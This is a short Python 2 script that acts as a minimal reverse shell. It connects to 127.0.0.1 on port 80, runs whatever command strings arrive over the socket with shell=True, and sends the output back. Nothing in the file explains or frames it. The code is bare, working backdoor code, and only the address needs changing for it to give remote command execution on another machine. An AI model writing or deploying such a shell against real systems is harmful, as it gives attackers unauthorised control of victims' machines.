import socket, os, subprocess

sock = socket.socket()
sock.connect(("127.0.0.1",80))

while True:
	data = sock.recv(4096)
	if not data: break
	print data
	proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	out = proc.stdout.read() + proc.stderr.read()
	sock.sendall(out)